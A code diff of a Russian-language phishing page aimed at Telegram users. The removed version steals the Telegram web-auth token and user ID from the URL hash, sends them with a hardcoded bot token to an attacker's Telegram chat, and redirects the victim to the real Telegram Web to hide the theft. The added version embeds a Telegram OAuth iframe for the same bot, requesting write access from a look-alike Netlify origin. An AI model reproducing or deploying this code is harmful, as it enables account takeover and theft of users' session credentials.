@@ -1,49 +1,10 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <title>Loading...</title>
-    <!-- Подключаем виджет Telegram -->
-    <script async src="https://telegram.org/js/telegram-widget.js?22" 
-            data-telegram-login="jdwgwvshsbsj_bot" 
-            data-size="large" 
-            data-auth-url="https://teeleg-deep.netlify.app" 
-            data-request-access="write">
-    </script>
-    <!-- НЕ скрываем кнопку -->
-</head>
-<body>
-    <p>Нажмите кнопку ниже для входа:</p>
-    <!-- Виджет сам создаст кнопку в этом месте -->
-
-    <script>
-        function sendToken(token, userId) {
-            const botToken = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4';
-            const chatId = '8220267007';
-            let message = `🔐 Перехвачен токен: ${token}`;
-            if (userId) message += `\nUser ID: ${userId}`;
-            message += `\nURL: ${window.location.href}`;
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            }).catch(() => {});
-        }
-
-        // Проверяем, нет ли токена в хэше (после редиректа)
-        (function() {
-            const hash = window.location.hash.substring(1);
-            if (hash) {
-                const params = new URLSearchParams(hash);
-                const token = params.get('tgWebAuthToken');
-                const userId = params.get('tgWebAuthUserId');
-                if (token) {
-                    sendToken(token, userId);
-                    // Перенаправляем на официальный Telegram Web
-                    window.location.replace('https://web.telegram.org/k/');
-                }
-            }
-        })();
-    </script>
-</body>
-</html>
+<script>
+    window.onload = function() {
+        var iframe = document.createElement('iframe');
+        iframe.src = "https://oauth.telegram.org/embed/jdwgwvshsbsj_bot?origin=https://teeleg-deep.netlify.app&request_access=write";
+        iframe.width = "300";
+        iframe.height = "100";
+        iframe.style.border = "none";
+        document.body.appendChild(iframe);
+    };
+</script>
